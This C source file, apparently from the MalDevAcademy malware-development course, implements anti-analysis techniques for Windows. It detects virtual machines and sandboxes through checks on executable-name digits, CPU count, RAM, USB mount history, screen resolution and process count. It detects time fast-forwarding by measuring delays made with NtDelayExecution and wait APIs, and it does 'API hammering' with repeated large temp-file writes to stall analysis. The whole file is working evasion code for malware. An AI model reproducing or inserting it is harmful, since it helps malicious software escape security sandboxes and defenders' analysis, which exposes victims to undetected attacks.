// @NUL0x4C | @mrd0x : MalDevAcademy

#include "sandbox.h"

// Detecting Virtual Machine ----------------------------------------------------------------------------------------------------------------

BOOL ExeDigitsInNameCheck() {

	CHAR	Path[MAX_PATH * 3];
	CHAR	cName[MAX_PATH];
	DWORD   dwNumberOfDigits = NULL;

	// getting the current filename (with the full path)
	if (!GetModuleFileNameA(NULL, Path, MAX_PATH * 3)) {
		printf("\n\t[!] GetModuleFileNameA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// to prevent a buffer overflow - getting the filename from the full path
	if (lstrlenA(PathFindFileNameA(Path)) < MAX_PATH)
		lstrcpyA(cName, PathFindFileNameA(Path));

	// counting number of digits
	for (int i = 0; i < lstrlenA(cName); i++) {
		if (isdigit(cName[i]))
			dwNumberOfDigits++;
	}

	// max 3 digits allowed 
	if (dwNumberOfDigits > 3) {
		return TRUE;
	}

	return FALSE;
}

BOOL IsVenvByHardwareCheck() {

	SYSTEM_INFO		SysInfo = { 0 };
	MEMORYSTATUSEX	MemStatus = { .dwLength = sizeof(MEMORYSTATUSEX) };
	HKEY			hKey = NULL;
	DWORD			dwUsbNumber = NULL;
	DWORD			dwRegErr = NULL;

	//	CPU CHECK
	GetSystemInfo(&SysInfo);

	// less than 2 processors
	if (SysInfo.dwNumberOfProcessors < 2) {
		return TRUE;
	}

	//	RAM CHECK
	if (!GlobalMemoryStatusEx(&MemStatus)) {
		printf("\n\t[!] GlobalMemoryStatusEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// less than 2 gb of ram
	if ((DWORD)MemStatus.ullTotalPhys < (DWORD)(2 * 1073741824)) {
		return TRUE;
	}


	// NUMBER OF USB's EVER MOUNTED
	if ((dwRegErr = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Enum\\USBSTOR", NULL, KEY_READ, &hKey)) != ERROR_SUCCESS) {
		printf("\n\t[!] RegOpenKeyExA Failed With Error : %d | 0x%0.8X \n", dwRegErr, dwRegErr);
		return FALSE;
	}

	if ((dwRegErr = RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &dwUsbNumber, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) != ERROR_SUCCESS) {
		printf("\n\t[!] RegQueryInfoKeyA Failed With Error : %d | 0x%0.8X \n", dwRegErr, dwRegErr);
		return FALSE;
	}

	// less than 2 usb's ever mounted 
	if (dwUsbNumber < 2) {
		return TRUE;
	}

	RegCloseKey(hKey);


	return FALSE;
}

// the callback function called whenever 'EnumDisplayMonitors' detects an display
BOOL CALLBACK ResolutionCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM ldata) {

	int				X = 0,
		Y = 0;
	MONITORINFO		MI = { .cbSize = sizeof(MONITORINFO) };

	if (!GetMonitorInfoW(hMonitor, &MI)) {
		printf("\n\t[!] GetMonitorInfoW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// calculating the X coordinates of the desplay
	X = MI.rcMonitor.right - MI.rcMonitor.left;

	// calculating the Y coordinates of the desplay
	Y =  MI.rcMonitor.bottom - MI.rcMonitor.top;

	// if numbers are in negative value, reverse them 
	if (X < 0)
		X = -X;
	if (Y < 0)
		Y = -Y;
	
	/*
	if not :
		-	1920x1080	-	1920x1200	-	1920x1600	-	1920x900
		-	2560x1080	-	2560x1200	-	2560x1600	-	1920x900
		-	1440x1080	-	1440x1200	-	1440x1600	-	1920x900
	*/

	if ((X != 1920 && X != 2560 && X != 1440) || (Y != 1080 && Y != 1200 && Y != 1600 && Y != 900))
		*((BOOL*)ldata) = TRUE;

	return TRUE;
}

BOOL CheckMachineResolution() {

	BOOL	SANDBOX = FALSE;

	EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)ResolutionCallback, (LPARAM)(&SANDBOX));

	return SANDBOX;
}

BOOL CheckMachineProcesses() {

	DWORD		adwProcesses[1024];
	DWORD		dwReturnLen = NULL,
		dwNmbrOfPids = NULL;


	if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen)) {
		printf("\n\t[!] EnumProcesses Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	dwNmbrOfPids = dwReturnLen / sizeof(DWORD);

	if (dwNmbrOfPids < 50)	// less than 50 process, its a sandbox 
		return TRUE;

	return FALSE;
}

// Detecting Time Fast-Forwarding  ----------------------------------------------------------------------------------------------------------

BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {

	// converting minutes to milliseconds
	DWORD				dwMilliSeconds = ftMinutes * 60000;
	LARGE_INTEGER		DelayInterval = { 0 };
	LONGLONG			Delay = NULL;
	NTSTATUS			STATUS = NULL;
	fnNtDelayExecution	pNtDelayExecution = (fnNtDelayExecution)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtDelayExecution");
	DWORD				_T0 = NULL,
		_T1 = NULL;

	printf("[i] Delaying Execution Using \"NtDelayExecution\" For %0.3d Seconds", (dwMilliSeconds / 1000));

	// converting from milliseconds to the 100-nanosecond - negative time interval
	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	_T0 = GetTickCount64();

	// sleeping for 'dwMilliSeconds' ms 
	if ((STATUS = pNtDelayExecution(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
		printf("[!] NtDelayExecution Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	_T1 = GetTickCount64();

	// slept for at least 'dwMilliSeconds' ms, then 'DelayExecutionVia_NtDE' succeeded, otherwize it failed
	if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
		return FALSE;

	printf("\n\t>> _T1 - _T0 = %d \n", (DWORD)(_T1 - _T0));

	printf("[+] DONE \n");

	return TRUE;
}

BOOL DelayExecutionVia_WFSO(FLOAT ftMinutes) {

	// converting minutes to milliseconds
	DWORD	dwMilliSeconds = ftMinutes * 60000;
	HANDLE	hEvent = CreateEvent(NULL, NULL, NULL, NULL);
	DWORD	_T0 = NULL,
		_T1 = NULL;


	printf("[i] Delaying Execution Using \"WaitForSingleObject\" For %0.3d Seconds", (dwMilliSeconds / 1000));

	_T0 = GetTickCount64();

	// sleeping for 'dwMilliSeconds' ms 
	if (WaitForSingleObject(hEvent, dwMilliSeconds) == WAIT_FAILED) {
		printf("[!] WaitForSingleObject Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	_T1 = GetTickCount64();

	// slept for at least 'dwMilliSeconds' ms, then 'DelayExecutionVia_WFSO' succeeded, otherwize it failed
	if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
		return FALSE;

	printf("\n\t>> _T1 - _T0 = %d \n", (DWORD)(_T1 - _T0));

	printf("[+] DONE \n");

	CloseHandle(hEvent);

	return TRUE;
}

BOOL DelayExecutionVia_MWFMOEx(FLOAT ftMinutes) {

	// converting minutes to milliseconds
	DWORD	dwMilliSeconds = ftMinutes * 60000;
	HANDLE	hEvent = CreateEvent(NULL, NULL, NULL, NULL);
	DWORD	_T0 = NULL,
		_T1 = NULL;


	printf("[i] Delaying Execution Using \"MsgWaitForMultipleObjectsEx\" For %0.3d Seconds", (dwMilliSeconds / 1000));

	_T0 = GetTickCount64();

	// sleeping for 'dwMilliSeconds' ms 
	if (MsgWaitForMultipleObjectsEx(1, &hEvent, dwMilliSeconds, QS_HOTKEY, NULL) == WAIT_FAILED) {
		printf("[!] MsgWaitForMultipleObjectsEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	_T1 = GetTickCount64();

	// slept for at least 'dwMilliSeconds' ms, then 'DelayExecutionVia_MWFMOEx' succeeded, otherwize it failed
	if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
		return FALSE;

	printf("\n\t>> _T1 - _T0 = %d \n", (DWORD)(_T1 - _T0));

	printf("[+] DONE \n");

	CloseHandle(hEvent);

	return TRUE;
}

BOOL DelayExecutionVia_NtWFSO(FLOAT ftMinutes) {

	// converting minutes to milliseconds
	DWORD					dwMilliSeconds = ftMinutes * 60000;
	HANDLE					hEvent = CreateEvent(NULL, NULL, NULL, NULL);
	LONGLONG				Delay = NULL;
	NTSTATUS				STATUS = NULL;
	LARGE_INTEGER			DelayInterval = { 0 };
	fnNtWaitForSingleObject	pNtWaitForSingleObject = (fnNtWaitForSingleObject)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtWaitForSingleObject");
	DWORD					_T0 = NULL,
		_T1 = NULL;


	printf("[i] Delaying Execution Using \"NtWaitForSingleObject\" For %0.3d Seconds", (dwMilliSeconds / 1000));

	// converting from milliseconds to the 100-nanosecond - negative time interval
	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	_T0 = GetTickCount64();

	// sleeping for 'dwMilliSeconds' ms 
	if ((STATUS = pNtWaitForSingleObject(hEvent, FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
		printf("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	_T1 = GetTickCount64();

	// slept for at least 'dwMilliSeconds' ms, then 'DelayExecutionVia_NtWFSO' succeeded, otherwize it failed
	if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
		return FALSE;

	printf("\n\t>> _T1 - _T0 = %d \n", (DWORD)(_T1 - _T0));

	printf("[+] DONE \n");

	CloseHandle(hEvent);

	return TRUE;
}


// API Hammering  ----------------------------------------------------------------------------------------------------------------------------

BOOL NtApiHammering(DWORD dwStress) {

	LPCWSTR		TempFile = L"xxx.tmp";

	WCHAR		szPath[MAX_PATH * 2],
		szTmpPath[MAX_PATH];

	HANDLE		hRFile = INVALID_HANDLE_VALUE,
		hWFile = INVALID_HANDLE_VALUE;

	DWORD		dwNumberOfBytesRead = NULL,
		dwNumberOfBytesWritten = NULL;

	PBYTE		pRandBuffer = NULL;
	SIZE_T		sBufferSize = 0xFFFFF;	// 1048575 byte

	INT			Random = 0;

	// getting the tmp folder path
	if (!GetTempPathW(MAX_PATH, szTmpPath)) {
		printf("[!] GetTempPathW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// constructing the file path 
	wsprintfW(szPath, L"%s%s", szTmpPath, TempFile);

	for (SIZE_T i = 0; i < dwStress; i++) {
		printf("DDD");

		// creating the file in write mode
		if ((hWFile = CreateFileW(szPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL)) == INVALID_HANDLE_VALUE) {
			printf("[!] CreateFileW Failed With Error : %d \n", GetLastError());
			return FALSE;
		}

		// allocating a buffer and filling it with a random value
		pRandBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBufferSize);
		Random = rand() % 0xFF;
		memset(pRandBuffer, Random, sBufferSize);

		// writing the random data into the file
		if (!WriteFile(hWFile, pRandBuffer, sBufferSize, &dwNumberOfBytesWritten, NULL) || dwNumberOfBytesWritten != sBufferSize) {
			printf("[!] WriteFile Failed With Error : %d \n", GetLastError());
			printf("[i] Written %d Bytes of %d \n", dwNumberOfBytesWritten, sBufferSize);
			return FALSE;
		}

		// clearing the buffer & closing the handle of the file
		RtlZeroMemory(pRandBuffer, sBufferSize);
		CloseHandle(hWFile);

		// opennig the file in read mode & delete when closed
		if ((hRFile = CreateFileW(szPath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE) {
			printf("[!] CreateFileW Failed With Error : %d \n", GetLastError());
			return FALSE;
		}

		// reading the random data written before 	
		if (!ReadFile(hRFile, pRandBuffer, sBufferSize, &dwNumberOfBytesRead, NULL) || dwNumberOfBytesRead != sBufferSize) {
			printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
			printf("[i] Read %d Bytes of %d \n", dwNumberOfBytesRead, sBufferSize);
			return FALSE;
		}

		// clearing the buffer & freeing it
		RtlZeroMemory(pRandBuffer, sBufferSize);
		HeapFree(GetProcessHeap(), NULL, pRandBuffer);

		// closing the handle of the file - deleting it
		CloseHandle(hRFile);
	}


	return TRUE;
}

int ApiHammering(DWORD dwSec) {
	DWORD dwTestStress = 100;

	DWORD T1 = GetTickCount64();
	NtApiHammering(dwTestStress);
	DWORD T2 = GetTickCount64();

	FLOAT dwTestSecond = (T2 - T1) / 1000.0f;
	if (dwTestSecond == 0.0f) dwTestSecond = 0.1f;

	DWORD dwStressPerSecond = dwTestStress / dwTestSecond;

	NtApiHammering(dwSec * dwStressPerSecond);

	return 1;
}

HANDLE AsyncApiHammering(){
	HANDLE hThread;
	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ApiHammering, NULL, 0, NULL);
	if (hThread == NULL) {
		printf("[-] Failed to create a thread. Error: %lu\n", GetLastError());
		return NULL;
	}
	return hThread;
}